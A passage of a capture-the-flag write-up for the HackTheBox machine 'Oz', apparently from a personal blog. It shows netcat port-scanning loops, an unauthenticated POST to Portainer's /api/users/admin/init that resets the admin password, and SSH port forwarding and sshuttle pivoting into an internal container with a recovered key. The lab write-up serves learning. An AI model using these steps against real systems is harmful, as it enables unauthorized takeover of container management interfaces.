+PORT     STATE SERVICE
+9000/tcp open  cslistener
+</code></pre>
+
+<p>NetCat</p>
+
+<p>using a bash for loop, it will go through the sequence. this can become cluttered</p>
+
+<pre><code>for ip in $(seq 1 65000);do
+nc -zv -w 1 172.17.0.2 $ip  2&gt;&amp;1 &gt; /tmp/nul | grep -v 'timed &amp;
+done
+
+for ip in $(seq 9000 9010);do
+nc -zv -w 1 172.17.0.2 $ip  2&gt;&amp;1 |grep 'succeeded!' &amp; 
+done
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/ew.PNG" alt="ew" /></p>
+
+<p>I dont like the for loop because it just craps out so much output. for some reason it always makes a mess. I think i modified the former from the netcat ip range scanner. The below option is much cleaner.</p>
+
+<pre><code>nc -zv -w 1  172.17.0.2 8900-10000 2&gt;&amp;1 | grep succeeded!
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/netcat.PNG" alt="netcat" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ssh-container.PNG" alt="ssh-container" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ssh-container-2.PNG" alt="ssh-container-2" /></p>
+
+<h2 id="exploiting-portainer">Exploiting Portainer</h2>
+
+<p>changing the password on portainer.io submit a POST request to the web directory/api/users/admin/init. I&rsquo;m not sure why submiting to init resets the admin password. i guess that&rsquo;s the api used to reset the password. Again i dont know.  Finish the request like in the pciture below. This will reset the admin password to whatever password you submit.</p>
+
+<p><img src="https://chickenpwny.github.io/images/change-pass-portainer.PNG" alt="change-pass-portainer" /></p>
+
+<p>Login with the submitted password</p>
+
+<p><img src="change-pass-portainer2.PNG" alt="change-pass-portainer2" /></p>
+
+<p>Portainer.io</p>
+
+<p>i think this is pretty cool i love messing with these web interfaces.</p>
+
+<p>some problems may occur the ssh tunnel may drop youll have to reset it by using the port knocking for loop. Be sure to turn off burp the proxy really slows it down it will not load.</p>
+
+<p><img src="https://chickenpwny.github.io/images/ssh-container-3.PNG" alt="ssh-container-3" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ssh-container-4.PNG" alt="ssh-container-4" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ssh-container-5.PNG" alt="ssh-container-5" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ssh-container-6.PNG" alt="ssh-container-6" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ssh-container-7.PNG" alt="ssh-container-7" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ssh-container-8.PNG" alt="ssh-container-8" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ssh-container-9.PNG" alt="ssh-container-9" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/ssh-container-10.PNG" alt="ssh-container-10" /></p>
+
+<p>it could take awhile to create the container or hang depends.</p>
+
+<p><img src="https://chickenpwny.github.io/images/ssh-container-12.PNG" alt="ssh-container-12" /></p>
+
+<p>change from /bin/bash to /bin/sh. there is a cron job running resetting the containers to default.</p>
+
+<p><img src="https://chickenpwny.github.io/images/ssh-container-14.PNG" alt="ssh-container-14" /></p>
+
+<p>ssh&gt; -L9051:172.17.0.2:9050</p>
+
+<p>another method is using the -L switch when logging in, you may also use sshutle.</p>
+
+<p>ssh -i dorthi.ssh dorthi@oz.htb -L 9051:172.17.0.2:9000</p>
+
+<p>python:2.7-alpine</p>
+
+<p>i could not get shuttle to work for some reason</p>
+
+<p>sshuttle</p>
+
+<p>sshuttle -r dorthi@oz.htb 172.0.0.0/16 &ndash;ssh-cmd &lsquo;ssh -i dorthi.ssh&rsquo;</p>
+
+
+
+    
+    
+        <div class="chevrons">
+    <div id="navigation">
+<a class="nav nav-prev" href="/hackthebox/boxes/mischief/" title="Mischief"> <i class="fa fa-chevron-left"></i><label>Mischief</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/poison/" title="Poison" style="margin-right: 0px;"><label>Poison</label><i class="fa fa-chevron-right"></i></a></div>
+  </div>
+
+  </section>
+</article>
+
+<footer>
+
+<div class="footline">
+    
+
+    
+
+    
+
+    
+    <div class="github-link">
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/Oz/_index.md" target="blank"><i class="fa fa-code-fork"></i>
+        Improve this page</a>
+    </div>
+    
+  </div>
+
+
+	<div>
+
+
+  
+    Create a content/_footer.md file to customize the footer content
+  
+
+
+
+	</div>
+</footer>
+
+<script src="/js/clipboard.min.js"></script>
+
+<link href="/css/featherlight.min.css" rel="stylesheet">
+<script src="/js/featherlight.min.js"></script>
+
+
+
+<script src="/theme-flex/script.js"></script>
+
+
+    
+
+    
+    
+
+    
+  </body>
+</html>
